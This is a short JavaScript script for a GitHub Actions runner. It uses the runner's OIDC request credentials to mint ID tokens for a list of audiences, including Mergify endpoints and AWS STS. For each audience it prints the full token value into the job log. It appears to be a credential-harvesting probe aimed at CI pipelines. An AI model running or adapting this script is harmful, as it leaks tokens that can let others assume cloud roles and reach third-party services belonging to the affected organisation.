const auds = [
  "https://api.mergify.com",
  "api.mergify.com",
  "mergify",
  "https://dashboard.mergify.com",
  "https://mergify.com",
  "mergify-ci",
  "https://ci.mergify.com",
  "sts.amazonaws.com",
];
(async () => {
  const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  const tok = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  console.log("OIDC_ENV", url ? "URL_SET" : "URL_MISSING", tok ? "TOK_SET" : "TOK_MISSING");
  if (!url || !tok) return;
  for (const a of auds) {
    try {
      const r = await fetch(url + "&audience=" + encodeURIComponent(a), { headers: { Authorization: "Bearer " + tok } });
      const j = await r.json().catch(() => ({}));
      console.log("AUD_RESULT " + a + " " + r.status + " " + (j.value ? j.value : JSON.stringify(j)));
    } catch (e) {
      console.log("AUD_ERR " + a + " " + String(e));
    }
  }
})();
